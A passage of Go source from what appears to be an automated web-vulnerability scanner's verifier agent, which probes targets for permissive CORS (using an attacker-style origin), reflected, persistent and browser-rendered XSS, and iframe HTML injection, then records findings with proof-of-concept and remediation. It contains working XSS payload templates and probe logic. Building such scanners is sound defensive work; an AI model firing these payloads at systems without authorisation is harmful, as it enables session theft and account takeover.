		return true
	}
	lower := strings.ToLower(s)
	switch lower {
	case "redacted", "[redacted]", "<redacted>", "masked", "[masked]", "<masked>",
		"hidden", "[hidden]", "<hidden>", "********", "**********":
		return true
	}
	maskRunes := 0
	otherRunes := 0
	for _, r := range s {
		switch r {
		case '*', '•', '●', 'x', 'X', '#':
			maskRunes++
		case '-', '_', ' ', '.':
			// separators are common in masked values; ignore them for the ratio
		default:
			otherRunes++
		}
	}
	return maskRunes >= 4 && otherRunes == 0
}

func authzJSONKey(norm string) bool {
	switch norm {
	case "role", "roles", "isadmin", "admin", "permissions", "permission",
		"scopes", "scope", "authorities", "authority", "groups", "group":
		return true
	}
	return false
}

func paymentJSONKey(norm string) bool {
	switch norm {
	case "card", "cards", "cardnum", "cardnumber", "creditcard",
		"creditcardnumber", "ccnumber", "pan", "maskedpan", "maskedcard",
		"last4", "exp", "expiry", "expiration", "expmonth", "expyear",
		"expirydate", "expirationdate", "cvv", "cvc", "iban", "bankaccount":
		return true
	}
	return false
}

func piiJSONKey(norm string) bool {
	switch norm {
	case "fullname", "firstname", "lastname", "name", "phone", "phonenumber",
		"mobile", "mobilenum", "mobilenumber", "address", "streetaddress",
		"street", "zipcode", "zip", "postalcode", "city", "country",
		"dateofbirth", "dob", "birthdate", "ssn", "nationalid", "taxid",
		"ip", "ipaddr", "ipaddress", "remoteaddr", "remoteaddress", "useragent":
		return true
	}
	return false
}

func ownerJSONKey(norm string) bool {
	switch norm {
	case "userid", "user", "ownerid", "owner", "customerid", "customer",
		"accountid", "account", "tenantid", "tenant", "organizationid",
		"orgid", "memberid", "profileid":
		return true
	}
	return false
}

func secretLikeJSONValue(value any) bool {
	s, ok := value.(string)
	if !ok {
		return false
	}
	s = strings.TrimSpace(s)
	if len(s) < 16 {
		return false
	}
	if strings.Count(s, ".") == 2 && len(s) >= 24 {
		return true // JWT-shaped
	}
	alphaNum := 0
	for _, r := range s {
		if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9') ||
			r == '-' || r == '_' || r == '+' || r == '/' || r == '=' {
			alphaNum++
		}
	}
	return alphaNum >= len(s)*3/4
}

func jwtPayloadSensitiveClaims(token string) []string {
	parts := strings.Split(strings.TrimSpace(token), ".")
	if len(parts) != 3 || len(parts[1]) < 8 {
		return nil
	}
	payloadPart := parts[1]
	padding := len(payloadPart) % 4
	if padding != 0 {
		payloadPart += strings.Repeat("=", 4-padding)
	}
	payload, err := base64.URLEncoding.DecodeString(payloadPart)
	if err != nil {
		payload, err = base64.RawURLEncoding.DecodeString(parts[1])
		if err != nil {
			return nil
		}
	}
	var parsed any
	if err := json.Unmarshal(payload, &parsed); err != nil {
		return nil
	}
	seen := make(map[string]bool)
	var out []string
	var walk func(any, []string)
	walk = func(value any, path []string) {
		switch v := value.(type) {
		case map[string]any:
			for key, child := range v {
				norm := normalizeJSONKey(key)
				next := append(path, key)
				if credentialMaterialJSONKey(norm) && exposedSecretJSONValue(child) {
					claim := strings.Join(next, ".")
					if !seen[strings.ToLower(claim)] {
						seen[strings.ToLower(claim)] = true
						out = append(out, claim)
					}
				}
				walk(child, next)
			}
		case []any:
			for _, child := range v {
				walk(child, path)
			}
		}
	}
	walk(parsed, nil)
	return out
}

func meaningfulJSONValue(value any) bool {
	switch v := value.(type) {
	case nil:
		return false
	case string:
		s := strings.TrimSpace(v)
		return s != "" && !strings.EqualFold(s, "null")
	case []any:
		return len(v) > 0
	case map[string]any:
		return len(v) > 0
	default:
		return true
	}
}

func jsonValueLooksEmail(value any) bool {
	s, ok := value.(string)
	if !ok {
		return false
	}
	return apiEmailValueRegex.MatchString(strings.TrimSpace(s))
}

func firstNRunes(s string, n int) string {
	if n <= 0 {
		return ""
	}
	for i := range s {
		if n == 0 {
			return s[:i]
		}
		n--
	}
	return s
}

func requestHasCredentialMaterial(headers map[string]string) bool {
	for key, value := range headers {
		lowerKey := strings.ToLower(strings.TrimSpace(key))
		lowerValue := strings.ToLower(value)
		switch lowerKey {
		case "authorization", "x-api-key", "x-auth-token", "x-access-token":
			if strings.TrimSpace(value) != "" {
				return true
			}
		case "cookie":
			if strings.Contains(lowerValue, "session") ||
				strings.Contains(lowerValue, "token") ||
				strings.Contains(lowerValue, "jwt") ||
				strings.Contains(lowerValue, "auth") ||
				strings.Contains(lowerValue, "connect.sid") {
				return true
			}
		}
	}
	return false
}

func observedAPIPrefixes(entries []types.TrafficEntry) []string {
	seen := make(map[string]bool)
	var prefixes []string
	add := func(prefix string) {
		prefix = "/" + strings.Trim(strings.TrimSpace(prefix), "/")
		if prefix == "/" || seen[prefix] {
			return
		}
		seen[prefix] = true
		prefixes = append(prefixes, prefix)
	}
	for _, entry := range entries {
		path := entry.Request.Path
		if path == "" {
			if parsed, err := url.Parse(entry.Request.URL); err == nil {
				path = parsed.Path
			}
		}
		parts := strings.Split(strings.Trim(path, "/"), "/")
		if len(parts) == 0 {
			continue
		}
		first := strings.ToLower(parts[0])
		switch first {
		case "api":
			add("/api")
			if len(parts) > 1 && apiVersionPrefixRegex.MatchString(parts[1]) {
				add("/api/" + parts[1])
			}
		case "rest":
			add("/rest")
		}
	}
	return prefixes
}

func sensitiveAPICandidatePaths(prefixes []string) []string {
	if len(prefixes) == 0 {
		prefixes = []string{"/api", "/rest"}
	}
	resourceSuffixes := []string{
		"/users", "/Users", "/user", "/accounts", "/Accounts",
		"/account", "/customers", "/Customers", "/members", "/profiles",
		"/profile", "/me", "/current-user", "/current_user", "/session",
		"/sessions", "/identity", "/auth/me", "/user/whoami",
		"/cards", "/Cards", "/payment", "/payments", "/payment-methods",
		"/billing", "/wallet", "/addresses", "/Addresses", "/Addresss",
		"/orders", "/Orders", "/basket", "/baskets", "/cart", "/carts",
	}
	seen := make(map[string]bool)
	var paths []string
	add := func(path string) {
		path = "/" + strings.Trim(path, "/")
		if path == "/" || seen[path] {
			return
		}
		seen[path] = true
		paths = append(paths, path)
	}
	for _, prefix := range prefixes {
		prefix = "/" + strings.Trim(prefix, "/")
		for _, suffix := range resourceSuffixes {
			add(prefix + suffix)
			if len(paths) >= 160 {
				return paths
			}
		}
	}
	for _, rootPath := range []string{
		"/users", "/user", "/accounts", "/account", "/customers",
		"/members", "/profiles", "/profile", "/me", "/session",
		"/cards", "/payment", "/payments", "/billing", "/wallet",
		"/addresses", "/orders", "/basket", "/cart",
	} {
		add(rootPath)
	}
	return paths
}

func firstNStrings(values []string, n int) []string {
	if len(values) <= n {
		return values
	}
	return values[:n]
}

// probeCORSPermissive checks the CORS policy on API endpoints that the
// crawler observed to be authenticated (401/403 or has_auth=1). Targets
// come from captured traffic — no hardcoded per-application paths.
// `Access-Control-Allow-Origin: *` on an authenticated API is a
// misconfiguration; paired with Access-Control-Allow-Credentials: true
// it's directly exploitable cross-site.
func (v *VerifierAgent) probeCORSPermissive(ctx context.Context, target string) {
	const evilOrigin = "https://evil.aobtd.test"

	// Target discovery: authenticated API endpoints from captured traffic.
	discovered, _ := discovery.DiscoverAuthenticatedAPIEndpoints(v.db, v.scanID)
	var apiURLs []string
	seen := make(map[string]bool)
	for _, ep := range discovered {
		if seen[ep.URL] {
			continue
		}
		seen[ep.URL] = true
		apiURLs = append(apiURLs, ep.URL)
		if len(apiURLs) >= 8 {
			break // CORS middleware is usually shared — one hit is enough
		}
	}
	if len(apiURLs) == 0 {
		// Fallback: probe the target root. If even the index page returns
		// ACAO:*, the CORS middleware is unconditionally permissive.
		apiURLs = []string{target + "/"}
	}

	for _, u := range apiURLs {
		if ctx.Err() != nil {
			return
		}
		req, err := http.NewRequestWithContext(ctx, "GET", u, nil)
		if err != nil {
			continue
		}
		req.Header.Set("Origin", evilOrigin)
		req.Header.Set("User-Agent", "AOBTD/Verifier (CORS probe)")
		resp, err := v.client.Do(req)
		if err != nil || resp == nil {
			continue
		}
		resp.Body.Close()
		v.tested++

		acao := resp.Header.Get("Access-Control-Allow-Origin")
		acac := resp.Header.Get("Access-Control-Allow-Credentials")

		permissive := acao == "*" || acao == evilOrigin
		if !permissive {
			v.dismissed++
			continue
		}
		// Browser-exploitable CORS data theft requires credentials to be
		// permitted and a concrete attacker origin to be allowed. ACAO=* with
		// no ACAC is common on public APIs and does not let an attacker read a
		// victim's credentialed response in modern browsers.
		if !corsAllowsCredentialedBrowserRead(acao, acac, evilOrigin) {
			v.dismissed++
			v.db.LogAI(v.scanID, "verifier", "cors_dismissed_non_credentialed",
				fmt.Sprintf("%s returned ACAO=%q ACAC=%q; not a credentialed browser-read CORS issue", u, acao, acac),
				"", u, "")
			continue
		}
		v.confirmed++
		severity := types.SeverityHigh

		// Extract path for pretty ID / title.
		path := u
		if parsed, err := url.Parse(u); err == nil {
			path = parsed.Path
		}
		profile := types.PageProfile{ID: "GET " + path, URL: u, Method: "GET"}
		v.storeFinding(profile, types.Finding{
			Title: fmt.Sprintf("Permissive CORS policy on %s (ACAO=%s)", path, acao),
			Description: fmt.Sprintf(
				"GET %s with `Origin: %s` returned `Access-Control-Allow-Origin: %s` "+
					"(credentials=%q). Authenticated APIs should reflect an allowlisted origin.",
				path, evilOrigin, acao, acac),
			Severity:   severity,
			Confidence: types.ConfidenceConfirmed,
			EndpointID: "GET " + path,
			VulnType:   "cors_misconfiguration",
			Payload:    fmt.Sprintf("Origin: %s", evilOrigin),
			PocRequest: strings.TrimSuffix(buildPlaceholderHTTPRequest("GET", u, ""), "\n\n") +
				fmt.Sprintf("\nOrigin: %s\n", evilOrigin),
			PocResponse: fmt.Sprintf(
				"HTTP/1.1 %d\nAccess-Control-Allow-Origin: %s\nAccess-Control-Allow-Credentials: %s\n",
				resp.StatusCode, acao, acac),
			StepsToReproduce: fmt.Sprintf(
				"1. Send GET %s with `Origin: %s`.\n"+
					"2. Response echoes ACAO=%s — any browser would allow the read.\n"+
					"3. With a victim's session, an attacker-hosted page reads the endpoint cross-site.",
				path, evilOrigin, acao),
			Impact: "Any HTTPS origin can read authenticated responses from this endpoint in a " +
				"victim's browser. Leaks user data, session-scoped tokens, and basket / order state.",
			Remediation: "Reflect only origins in an explicit allowlist. Never pair wildcard " +
				"ACAO with Access-Control-Allow-Credentials: true.",
			Evidence: fmt.Sprintf("URL: %s\nOrigin sent: %s\nACAO: %s\nACAC: %s",
				u, evilOrigin, acao, acac),
		})
		v.db.InsertNarration(v.scanID, "verifier", "confirmed",
			fmt.Sprintf("%s returns ACAO=%s for attacker origin — CORS misconfigured.",
				path, acao),
			u, nil)
		return // one CORS hit is enough — shared middleware
	}
}

func corsAllowsCredentialedBrowserRead(acao, acac, origin string) bool {
	return strings.EqualFold(strings.TrimSpace(acac), "true") &&
		strings.TrimSpace(acao) == strings.TrimSpace(origin)
}

// probeReflectedInput submits a distinctive marker to search / query
// endpoints and checks whether the response reflects it unescaped.
func (v *VerifierAgent) probeReflectedInput(ctx context.Context, target string) {
	marker := "AOBTDmark<svg/onload=1>"
	encodedMarker := url.QueryEscape(marker)

	// Target discovery: GET endpoints with observed query parameters.
	// For each, inject the marker under ONE of its parameters at a time
	// and watch for a literal reflection in the response body. Generic —
	// works against any application that renders input into responses.
	discovered, _ := discovery.DiscoverQueryParamEndpoints(v.db, v.scanID)
	type reflectTarget struct {
		baseURL, param string
	}
	var targets []reflectTarget
	seen := make(map[string]bool)
	for _, ep := range discovered {
		base := strings.SplitN(ep.URL, "?", 2)[0]
		for _, p := range ep.Params {
			key := base + "|" + p
			if seen[key] {
				continue
			}
			seen[key] = true
			targets = append(targets, reflectTarget{base, p})
			if len(targets) >= 40 {
				break
			}
		}
		if len(targets) >= 40 {
			break
		}
	}
	if len(targets) == 0 {
		// Fallback: try a marker-in-path probe against the target root.
		// Also try a handful of generic search-ish param names.
		for _, p := range []string{"q", "query", "search", "term", "keyword"} {
			targets = append(targets, reflectTarget{target + "/", p})
		}
	}

nextTarget:
	for _, rt := range targets {
		if ctx.Err() != nil {
			return
		}
		path := rt.baseURL
		if parsed, err := url.Parse(rt.baseURL); err == nil {
			path = parsed.Path
		}

		for _, payload := range xssPayloads {
			encodedPayload := url.QueryEscape(payload.payload)
			u := fmt.Sprintf("%s?%s=%s", rt.baseURL, rt.param, encodedPayload)
			resp, body, _, err := v.proactiveGET(ctx, u)
			if err != nil || resp == nil {
				continue
			}
			v.tested++
			if !strings.Contains(body, payload.detect) {
				v.dismissed++
				continue
			}
			if !responseLooksHTMLExecutable(resp, body) {
				v.logger.Debug("reflected XSS-shaped payload in non-executable response",
					"url", u,
					"content_type", resp.Header.Get("Content-Type"))
				continue
			}
			v.confirmed++
			profile := types.PageProfile{ID: "GET " + path, URL: u, Method: "GET"}
			v.storeFinding(profile, types.Finding{
				Title: fmt.Sprintf("Reflected XSS payload returned by %s?%s=",
					path, rt.param),
				Description: fmt.Sprintf(
					"GET %s?%s=<xss payload> returned the dangerous payload marker %q "+
						"verbatim in the response body. This is stronger than a benign "+
						"reflection signal because the response preserves executable syntax.",
					path, rt.param, payload.detect),
				Severity:   types.SeverityHigh,
				Confidence: types.ConfidenceConfirmed,
				EndpointID: "GET " + path,
				VulnType:   "reflected_xss",
				Payload:    payload.payload,
				PocRequest: fmt.Sprintf("GET %s?%s=%s HTTP/1.1\nHost: <target>\n",
					path, rt.param, encodedPayload),
				PocResponse: fmt.Sprintf("HTTP/1.1 %d\n\n%s",
					resp.StatusCode, truncateString(body, 500)),
				StepsToReproduce: fmt.Sprintf(
					"1. Send GET %s?%s=%s.\n"+
						"2. Observe %q appears verbatim in the response body.\n"+
						"3. Open the URL in a browser and verify execution in the rendered context.",
					path, rt.param, encodedPayload, payload.detect),
				Impact: "Reflected XSS can execute attacker-controlled JavaScript in a victim's browser. " +
					"Impact includes credential theft, phishing overlays, session actions, and account takeover chains.",
				Remediation: "Contextually encode untrusted input on output and apply a restrictive CSP as defense-in-depth.",
				Evidence: fmt.Sprintf("URL: %s\nParam: %s\nPayload: %s\nDetector: %s\nBody preview: %s",
					u, rt.param, payload.payload, payload.detect, truncateString(body, 400)),
			})
			v.db.InsertNarration(v.scanID, "verifier", "confirmed",
				fmt.Sprintf("%s?%s= reflected executable XSS syntax (%s).",
					path, rt.param, payload.detect),
				u, nil)
			continue nextTarget
		}

		u := fmt.Sprintf("%s?%s=%s", rt.baseURL, rt.param, encodedMarker)
		resp, body, _, err := v.proactiveGET(ctx, u)
		if err != nil || resp == nil {
			continue
		}
		v.tested++

		if !strings.Contains(body, marker) {
			v.dismissed++
			continue
		}
		profile := types.PageProfile{ID: "GET " + path, URL: u, Method: "GET"}
		v.storeFinding(profile, types.Finding{
			Title: fmt.Sprintf("Reflected input on %s?%s= (manual XSS follow-up)",
				path, rt.param),
			Description: fmt.Sprintf(
				"GET %s?%s=%s returned a distinctive marker verbatim. The verifier did "+
					"not observe an executable XSS payload reflected on the same parameter, "+
					"so this is reported as a follow-up candidate rather than confirmed XSS.",
				path, rt.param, marker),
			Severity:   types.SeverityLow,
			Confidence: types.ConfidenceLikely,
			EndpointID: "GET " + path,
			VulnType:   "reflected_input",
			Payload:    marker,
			PocRequest: fmt.Sprintf("GET %s?%s=%s HTTP/1.1\nHost: <target>\n",
				path, rt.param, encodedMarker),
			PocResponse: fmt.Sprintf("HTTP/1.1 %d\n\n%s",
				resp.StatusCode, truncateString(body, 500)),
			StepsToReproduce: fmt.Sprintf(
				"1. Send GET %s?%s=%s.\n"+
					"2. Observe %q appears verbatim in response.\n"+
					"3. Manually verify the rendering context before classifying as XSS.",
				path, rt.param, encodedMarker, marker),
			Impact: "This is an input-reflection sink that may become XSS if client-side or server-side rendering " +
				"places the value into an executable context.",
			Remediation: "Encode reflected parameters for the appropriate context " +
				"(HTML, attribute, JS, URL) on output.",
			Evidence: fmt.Sprintf("URL: %s\nParam: %s\nMarker: %s\nBody preview: %s",
				u, rt.param, marker, truncateString(body, 400)),
		})
		v.db.InsertNarration(v.scanID, "verifier", "likely",
			fmt.Sprintf("%s?%s= reflected a marker, but executable XSS syntax was not confirmed.",
				path, rt.param),
			u, nil)
	}
}

type pathNamedXSSTarget struct {
	baseURL string
	path    string
	param   string
	source  string
}

func (v *VerifierAgent) probePathNamedXSS(ctx context.Context, target string) {
	entries, err := v.db.GetTrafficByScan(v.scanID)
	if err != nil || len(entries) == 0 {
		return
	}

	var targets []pathNamedXSSTarget
	seen := make(map[string]bool)
	add := func(baseURL, path, param, source string) {
		baseURL = strings.TrimSpace(baseURL)
		param = strings.TrimSpace(param)
		if baseURL == "" || param == "" {
			return
		}
		if parsed, err := url.Parse(baseURL); err == nil {
			parsed.RawQuery = ""
			parsed.Fragment = ""
			baseURL = parsed.String()
			if path == "" {
				path = parsed.Path
			}
		}
		key := baseURL + "|" + param
		if seen[key] {
			return
		}
		seen[key] = true
		targets = append(targets, pathNamedXSSTarget{baseURL: baseURL, path: path, param: param, source: source})
	}

	for _, entry := range entries {
		if !strings.EqualFold(entry.Request.Method, "GET") {
			continue
		}
		path := entry.Request.Path
		if path == "" {
			if parsed, err := url.Parse(entry.Request.URL); err == nil {
				path = parsed.Path
			}
		}
		for _, param := range pathNamedXSSParams(path) {
			add(entry.Request.URL, path, param, "observed XSS-shaped route")
		}
		if len(targets) >= 32 {
			break
		}
	}
	if len(targets) == 0 {
		return
	}

nextTarget:
	for _, rt := range targets {
		if ctx.Err() != nil {
			return
		}
		v.clearCachePoisoningLevel(ctx, rt.baseURL, rt.path)
		for _, tmpl := range pathNamedXSSPayloadTemplates(rt.path) {
			if ctx.Err() != nil {
				return
			}
			marker := fmt.Sprintf("AOBTD_XSS_%d", time.Now().UnixNano())
			payload := fmt.Sprintf(tmpl, marker)
			u := urlWithQueryParamMust(rt.baseURL, rt.param, payload)
			if u == "" {
				continue
			}
			resp, body, _, err := v.proactiveGET(ctx, u)
			if err != nil || resp == nil {
				continue
			}
			v.tested++
			signal, ok := reflectedXSSExecutionSignal(body, marker)
			if !ok {
				v.dismissed++
				continue
			}
			v.confirmed++
			path := rt.path
			if path == "" {
				path = rt.baseURL
				if parsed, err := url.Parse(rt.baseURL); err == nil {
					path = parsed.Path
				}
			}
			vulnType := "reflected_xss"
			titlePrefix := "Reflected XSS"
			if pathNamedXSSLooksPersistent(path) {
				vulnType = "persistent_xss"
				titlePrefix = "Persistent XSS"
			}
			profile := types.PageProfile{ID: "GET " + path, URL: u, Method: "GET"}
			v.storeFinding(profile, types.Finding{
				Title: fmt.Sprintf("%s on %s via %s",
					titlePrefix, path, rt.param),
				Description: fmt.Sprintf(
					"GET %s with parameter %q set to a marker payload returned the marker inside an executable HTML context (%s). The route was selected from an observed XSS-shaped path, not from a broad parameter spray. Source: %s.",
					path, rt.param, signal, rt.source),
				Severity:   types.SeverityHigh,
				Confidence: types.ConfidenceConfirmed,
				EndpointID: "GET " + path,
				VulnType:   vulnType,
				ParamName:  rt.param,
				Payload:    payload,
				PocRequest: fmt.Sprintf("GET %s?%s=%s HTTP/1.1\nHost: <target>\n",
					path, rt.param, url.QueryEscape(payload)),
				PocResponse: fmt.Sprintf("HTTP/1.1 %d\nContent-Type: %s\n\n%s",
					resp.StatusCode, resp.Header.Get("Content-Type"), truncateString(body, 700)),
				StepsToReproduce: fmt.Sprintf(
					"1. Send GET %s?%s=%s.\n"+
						"2. Observe the response preserves marker %q inside %s.\n"+
						"3. Render the returned HTML fragment/page in the application context; the payload executes under the target origin.",
					path, rt.param, url.QueryEscape(payload), marker, signal),
				Impact:      "An attacker can cause JavaScript to execute under the target origin. Impact includes session actions, credential theft, phishing overlays, and account takeover chains when combined with authenticated victims.",
				Remediation: "Use context-appropriate output encoding and sanitize user-controlled HTML with a strict allowlist. Avoid inserting server-returned HTML fragments into the DOM as trusted markup.",
				Evidence: fmt.Sprintf("URL: %s\nParam: %s\nPayload: %s\nSignal: %s\nBody preview: %s",
					u, rt.param, payload, signal, truncateString(body, 500)),
			})
			v.db.InsertNarration(v.scanID, "verifier", "confirmed",
				fmt.Sprintf("%s confirmed on %s?%s= via %s.", titlePrefix, path, rt.param, signal),
				u, nil)
			continue nextTarget
		}
	}
}

func pathNamedXSSParams(path string) []string {
	lower := strings.ToLower(path)
	switch {
	case strings.Contains(lower, "xssinimgtagattribute"):
		return []string{"src"}
	case strings.Contains(lower, "xsswithhtmltaginjection"):
		return []string{"comment", "input"}
	case strings.Contains(lower, "persistentxssinhtmltag"):
		return []string{"comment"}
	case strings.Contains(lower, "cachepoisoning"):
		return []string{"banner"}
	default:
		return nil
	}
}

func pathNamedXSSPayloadTemplates(path string) []string {
	lower := strings.ToLower(path)
	switch {
	case strings.Contains(lower, "xssinimgtagattribute"):
		return []string{
			`<script>window.%s=1</script>`,
			`x onerror="window.%s=1"`,
			`x onerror=window.%s=1`,
		}
	case strings.Contains(lower, "xsswithhtmltaginjection"):
		return []string{
			`<script>window.%s=1</script>`,
			`<details open ontoggle="window.%s=1">x</details>`,
			`<svg onload="window.%s=1">`,
		}
	case strings.Contains(lower, "persistentxssinhtmltag"):
		return []string{
			`<script>window.%s=1</script>`,
			`<svg onload="window.%s=1">`,
			`<details open ontoggle="window.%s=1">x</details>`,
		}
	case strings.Contains(lower, "cachepoisoning"):
		return []string{
			`<svg/onload="window.%s=1">`,
			`<details open ontoggle="window.%s=1">x</details>`,
		}
	default:
		return []string{
			`<script>window.%s=1</script>`,
			`<svg onload="window.%s=1">`,
		}
	}
}

func pathNamedXSSLooksPersistent(path string) bool {
	return strings.Contains(strings.ToLower(path), "persistentxss")
}

var xssLevelPattern = regexp.MustCompile(`(?i)/CachePoisoning/(LEVEL_\d+)`)

func (v *VerifierAgent) clearCachePoisoningLevel(ctx context.Context, baseURL, path string) {
	match := xssLevelPattern.FindStringSubmatch(path)
	if len(match) < 2 {
		return
	}
	origin := originFromURL(baseURL)
	if origin == "" {
		return
	}
	idx := strings.Index(strings.ToLower(path), "/cachepoisoning/")
	if idx < 0 {
		return
	}
	clearURL := origin + path[:idx] + "/CachePoisoning/clearCache?level=" + url.QueryEscape(strings.ToUpper(match[1]))
	req, err := http.NewRequestWithContext(ctx, "POST", clearURL, nil)
	if err != nil {
		return
	}
	req.Header.Set("User-Agent", "AOBTD/Verifier (cache-xss reset)")
	resp, err := v.client.Do(req)
	if err != nil || resp == nil {
		return
	}
	io.Copy(io.Discard, io.LimitReader(resp.Body, 4096))
	resp.Body.Close()
}

func reflectedXSSExecutionSignal(body, marker string) (string, bool) {
	marker = strings.ToLower(strings.TrimSpace(marker))
	if marker == "" {
		return "", false
	}
	for _, tag := range htmlTags(body, "script") {
		if strings.Contains(strings.ToLower(tag), marker) {
			return "raw <script> tag containing marker", true
		}
	}
	for _, tag := range htmlTags(body, "svg") {
		lower := strings.ToLower(tag)
		if strings.Contains(lower, marker) && strings.Contains(lower, "onload") {
			return "raw <svg onload> tag containing marker", true
		}
	}
	for _, tag := range htmlTags(body, "details") {
		lower := strings.ToLower(tag)
		if strings.Contains(lower, marker) && strings.Contains(lower, "ontoggle") {
			return "raw <details ontoggle> tag containing marker", true
		}
	}
	for _, tag := range htmlTags(body, "iframe") {
		lower := strings.ToLower(tag)
		if strings.Contains(lower, marker) && strings.Contains(lower, "javascript:") {
			return "raw <iframe src=javascript:...> tag containing marker", true
		}
	}
	for _, tag := range htmlTags(body, "img") {
		lower := strings.ToLower(tag)
		if strings.Contains(lower, marker) && strings.Contains(lower, "onerror") {
			return "raw <img onerror> attribute containing marker", true
		}
		if strings.Contains(lower, marker) && strings.Contains(lower, "src=") && strings.Contains(lower, "javascript:") {
			return "raw <img src=javascript:...> attribute containing marker", true
		}
	}
	return "", false
}

func htmlTags(body, tag string) []string {
	tag = strings.TrimSpace(tag)
	if tag == "" || strings.ContainsAny(tag, `\^$.*+?()[]{}|`) {
		return nil
	}
	if strings.EqualFold(tag, "script") {
		re := regexp.MustCompile(`(?is)<script\b[^>]*>.*?</script\s*>`)
		return re.FindAllString(body, -1)
	}
	re := regexp.MustCompile(`(?is)<` + tag + `\b[^>]*>`)
	return re.FindAllString(body, -1)
}

func (v *VerifierAgent) probeBrowserRenderedXSS(ctx context.Context, target string) {
	if v.browser == nil || v.browser.Browser() == nil {
		return
	}

	discovered, _ := discovery.DiscoverQueryParamEndpoints(v.db, v.scanID)
	var targets []browserXSSRenderTarget
	seen := make(map[string]bool)
	addTarget := func(baseURL, param, source string) bool {
		if strings.TrimSpace(baseURL) == "" || strings.TrimSpace(param) == "" {
			return false
		}
		key := baseURL + "|" + param
		if seen[key] {
			return false
		}
		seen[key] = true
		targets = append(targets, browserXSSRenderTarget{baseURL: baseURL, param: param, source: source})
		return true
	}
	for _, ep := range discovered {
		base := strings.SplitN(ep.URL, "?", 2)[0]
		for _, p := range ep.Params {
			if !browserXSSLooksSearchLike(base, p) {
				continue
			}
			addTarget(base, p, "observed query/search endpoint")
			if len(targets) >= 20 {
				break
			}
		}
		if len(targets) >= 20 {
			break
		}
	}
	jsTargetsAdded := 0
	for _, rt := range v.discoverJSBrowserXSSRenderTargets(ctx, target) {
		if len(targets) >= 28 || jsTargetsAdded >= 8 {
			break
		}
		if addTarget(rt.baseURL, rt.param, rt.source) {
			jsTargetsAdded++
		}
	}

	for _, rt := range targets {
		if ctx.Err() != nil {
			return
		}
		v.tested++
		maxPayloads := 2
		if strings.HasPrefix(rt.source, "javascript route sink") {
			maxPayloads = 1
		}
		proof, ok := v.tryBrowserXSSLimited(ctx, rt.baseURL, rt.param, maxPayloads)
		if !ok {
			v.dismissed++
			continue
		}
		v.confirmed++
		path := rt.baseURL
		if parsed, err := url.Parse(rt.baseURL); err == nil {
			path = parsed.Path
			if path == "" {
				path = "/"
			}
		}
		profile := types.PageProfile{ID: "GET " + path, URL: proof.URL, Method: "GET"}
		v.storeFinding(profile, types.Finding{
			Title: fmt.Sprintf("Browser-executed XSS in '%s' parameter", rt.param),
			Description: fmt.Sprintf(
				"The '%s' parameter reaches a browser-rendered sink. The verifier opened candidate UI/API render URLs in headless Chrome and observed JavaScript execution via %s. Source: %s.",
				rt.param, proof.Signal, rt.source),
			Severity:         types.SeverityHigh,
			Confidence:       types.ConfidenceConfirmed,
			EndpointID:       "GET " + path,
			VulnType:         "xss_browser",
			ParamName:        rt.param,
			Payload:          proof.Payload,
			PocRequest:       fmt.Sprintf("Open in browser: %s", proof.URL),
			PocResponse:      fmt.Sprintf("Browser proof: %s\nAlert message: %s", proof.Signal, proof.AlertMessage),
			StepsToReproduce: fmt.Sprintf("1. Open %s in a browser.\n2. Observe the injected payload executes (%s).", proof.URL, proof.Signal),
			Impact: "A victim following a crafted link can execute attacker-controlled JavaScript under the target origin. " +
				"Impact includes credential theft, session actions, account takeover chains, and phishing overlays.",
			Remediation: "Do not render query parameters or API-returned user content with unsafe HTML trust. Contextually encode on output and enforce a strict CSP.",
			Evidence: fmt.Sprintf("Candidate URL: %s\nSource: %s\nPayload kind: %s\nPayload: %s\nSignal: %s\nAlert: %s",
				proof.URL, rt.source, proof.Kind, proof.Payload, proof.Signal, proof.AlertMessage),
		})
		v.db.InsertNarration(v.scanID, "verifier", "confirmed",
			fmt.Sprintf("Browser-rendered XSS confirmed for %s?%s= via %s.",
				path, rt.param, proof.Signal),
			proof.URL, nil)
	}
}

const commonIframeEmbedPayload = `<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>`

func (v *VerifierAgent) probeBrowserIframeHTMLInjection(ctx context.Context, target string) {
	if v.browser == nil || v.browser.Browser() == nil {
		return
	}
	targets := browserHTMLInjectionRenderTargets(v.db, v.scanID, target, 8)
	for _, rt := range targets {
		if ctx.Err() != nil {
			return
		}
		for _, candidate := range browserXSSCandidateURLs(v.target, rt.baseURL, rt.param, commonIframeEmbedPayload) {
			v.tested++
			ok := v.executeBrowserIframeHTMLInjectionProbe(ctx, candidate, "w.soundcloud.com/player/")
			if !ok {
				v.dismissed++
				continue
			}
			v.confirmed++
			path := rt.baseURL
			if parsed, err := url.Parse(rt.baseURL); err == nil {
				path = parsed.Path
				if path == "" {
					path = "/"
				}
			}
			profile := types.PageProfile{ID: "GET " + path, URL: candidate, Method: "GET"}
			v.storeFinding(profile, types.Finding{
				Title:            fmt.Sprintf("Browser-rendered HTML injection permits iframe embedding in %q", rt.param),
				Description:      fmt.Sprintf("The browser rendered an attacker-supplied iframe from parameter %q on %s. This proves arbitrary HTML embedding in the client-side rendering sink even if no JavaScript alert/dialog is required for exploitation.", rt.param, rt.baseURL),
				Severity:         types.SeverityMedium,
				Confidence:       types.ConfidenceConfirmed,
				EndpointID:       "GET " + path,
				VulnType:         "html_injection",
				ParamName:        rt.param,
				Payload:          commonIframeEmbedPayload,
				PocRequest:       fmt.Sprintf("GET %s?%s=<iframe ...> HTTP/1.1\nHost: <target>\n", path, rt.param),
				PocResponse:      "Browser DOM contained an iframe whose src matched w.soundcloud.com/player/",
				StepsToReproduce: fmt.Sprintf("1. Open %s with parameter %q set to the iframe payload.\n2. Inspect the browser DOM.\n3. Observe an injected iframe with src containing w.soundcloud.com/player/.", rt.baseURL, rt.param),
				Impact:           "Arbitrary HTML embedding can be used for phishing, clickjacking-like UI overlays, data exfiltration through embedded origins, and as a stepping stone to script execution when combined with permissive sinks.",
				Remediation:      "Render user-controlled text as text, not HTML. Sanitize with a strict allowlist that removes iframes and dangerous URL schemes, or avoid binding untrusted values into innerHTML entirely.",
				Evidence:         fmt.Sprintf("URL: %s\nSource: %s\nPayload: %s", candidate, rt.source, commonIframeEmbedPayload),
			})
			v.db.InsertNarration(v.scanID, "verifier", "confirmed",
				fmt.Sprintf("Browser rendered attacker-controlled iframe on %s?%s=.", path, rt.param),
